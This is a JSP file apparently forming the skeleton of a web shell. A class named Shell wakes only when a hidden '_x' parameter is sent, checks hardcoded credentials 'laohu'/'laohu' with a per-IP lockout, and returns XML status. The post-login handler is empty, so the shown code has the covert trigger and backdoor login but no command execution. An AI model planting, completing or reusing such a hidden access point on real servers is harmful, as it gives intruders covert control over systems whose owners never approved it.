<%@ page import="org.w3c.dom.Document" %>
<%@ page import="org.w3c.dom.Element" %>
<%@ page import="javax.xml.parsers.DocumentBuilder" %>
<%@ page import="javax.xml.parsers.DocumentBuilderFactory" %>
<%@ page import="javax.xml.parsers.ParserConfigurationException" %>
<%@ page import="javax.xml.transform.Transformer" %>
<%@ page import="javax.xml.transform.TransformerException" %>
<%@ page import="javax.xml.transform.TransformerFactory" %>
<%@ page import="javax.xml.transform.dom.DOMSource" %>
<%@ page import="javax.xml.transform.stream.StreamResult" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.Map" %>
<%!
    public static final class Config {
        public static final String USER = "laohu";
        public static final String PASSWORD = "laohu";
        public static final int BLOCKING_TIME = 30; // seconds
        public static final int MAX_FAIL = 5;
    }

    public boolean onService(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspContext context, ServletContext application, ServletConfig config, JspWriter out) throws IOException, ServletException {
        Shell shell = new Shell(request, response, session, context, application, config, out);
        return shell.run();
    }

    public static class Shell {
        private HttpServletRequest request;
        private HttpServletResponse response;
        private HttpSession session;
        private JspContext context;
        private ServletContext application;
        private ServletConfig config;
        private JspWriter out;
        private int code = 403;
        private String message = "Unauthorized";
        private HashMap<String, Object> data = new HashMap<>();

        public Shell(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspContext context, ServletContext application, ServletConfig config, JspWriter out) {
            this.request = request;
            this.response = response;
            this.session = session;
            this.context = context;
            this.application = application;
            this.config = config;
            this.out = out;
        }

        public boolean run() {
            boolean ret = shouldInShell();
            if (ret) {
                //
                internalRun();
                output(code, message, data);
            }
            return ret;
        }

        protected void internalRun() {
            if (!isLogined()) {
                if (isInLogin()) {
                    inDoLogin();
                    return;
                }
                return;
            }
        }


        public boolean shouldInShell() {
            if (getParam("_x", null) != null) {
                return true;
            }
            return false;
        }

        public String getParam(String name, String defaultValue) {
            String value = request.getParameter(name);
            return value == null ? defaultValue : value;
        }

        public boolean isLogined() {
            return Config.USER.equals(session.getAttribute("_user"));
        }

        public boolean isInLogin() {
            return request.getMethod().toUpperCase().equals("POST") && "login-form".equals(request.getParameter("form-name"));
        }

        public int getBlockTime() {
            String key = "_blockUtil_" + request.getRemoteAddr();
            Long blockUtil = (Long) session.getAttribute(key);
            return blockUtil == null ? 0 : (int) (Math.max(0, blockUtil - System.currentTimeMillis()) / 1000);
        }

        public void setBlock() {
            String key = "_blockUtil_" + request.getRemoteAddr();
            Long blockUtil = System.currentTimeMillis() + Config.BLOCKING_TIME * 1000;
            session.setAttribute(key, blockUtil);
        }

        public int getTryTime() {
            String key = "_tryTime_" + request.getRemoteAddr();
            Integer tryTime = (Integer) session.getAttribute(key);
            return tryTime == null ? 0 : tryTime;
        }

        public void setTryTime(int tryTime) {
            String key = "_tryTime_" + request.getRemoteAddr();
            session.setAttribute(key, tryTime);
        }

        public void output(int code, String msg, Map<String, Object> data) {
            try {
                response.resetBuffer();
                response.setContentType("application/xml");
                response.setCharacterEncoding("utf-8");

                DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
                DocumentBuilder builder = builderFactory.newDocumentBuilder();
                Document doc = builder.newDocument();
                //build dom
                Element codeElement = doc.createElement("code");
                Element root = doc.createElement("result");
                doc.appendChild(root);
                root.appendChild(codeElement);
                codeElement.setTextContent(String.valueOf(code));
                Element messageElement = doc.createElement("message");
                root.appendChild(messageElement);
                messageElement.setTextContent(msg);
                Element dataElement = createElement(doc, "data", data);
                root.appendChild(dataElement);
                //
                //transform
                TransformerFactory transformerFactory = TransformerFactory.newInstance();
                Transformer transformer = transformerFactory.newTransformer();
                DOMSource domSource = new DOMSource(doc);
                StreamResult streamResult = new StreamResult(out);
                transformer.transform(domSource, streamResult);
            } catch (TransformerException e) {
                e.printStackTrace();
                return;
            } catch (ParserConfigurationException e) {
                e.printStackTrace();
                return;
            }
        }

        protected Element createElement(Document doc, String name, Object value) {
            Element element = doc.createElement(name);
            Class clazz = value.getClass();
            if (clazz.isArray()) {
                Object[] items = (Object[]) value;
                for (Object item : items) {
                    element.appendChild(createElement(doc, "item", item));
                }
            } else if (List.class.isAssignableFrom(clazz)) {
                List<Object> items = (List<Object>) value;
                for (Object item : items) {
                    element.appendChild(createElement(doc, "item", item));
                }
            } else if (Map.class.isAssignableFrom(clazz)) {
                Map<Object, Object> map = (Map<Object, Object>) value;
                for (Map.Entry entry : map.entrySet()) {
                    element.appendChild(createElement(doc, entry.getKey().toString(), entry.getValue()));
                }
            } else {
                element.setTextContent(value.toString());
            }
            return element;
        }

        public void inDoLogin() {
            String userName = getParam("userName", "").trim();
            String password = getParam("password", "").trim();
            if (userName.length() == 0 || password.length() == 0) {
                data.put("empty-input", "");
                return;
            }
            if (!checkCanLogin()) {
                return;
            }
            if (Config.USER.equals(userName) && Config.PASSWORD.equals(password)) {
                data.put("username", userName);
                code = 200;
                message = "OK";
                session.setAttribute("_user", Config.USER);
                return;
            }
            onLoginFailed();
        }

        protected boolean checkCanLogin() {
            int blockTime = getBlockTime();
            boolean ret = blockTime > 0;
            if (ret) {
                data.put("block-time", blockTime);
            }
            return !ret;
        }

        protected void onLoginFailed() {
            data.put("not-match", 1);
            int tryTime = getTryTime();
            ++tryTime;
            data.put("try-time", tryTime);
            if (tryTime >= Config.MAX_FAIL) {
                setBlock();
                data.remove("try-time");
                tryTime = 0;
                data.put("block-time", getBlockTime());
            }
            setTryTime(tryTime);
            data.put("max-try", Config.MAX_FAIL);
            data.put("block-wait", Config.BLOCKING_TIME);
        }
    }


%>
<%
    if (onService(request, response, session, pageContext, application, config, out)) {
        return;
    }
%>
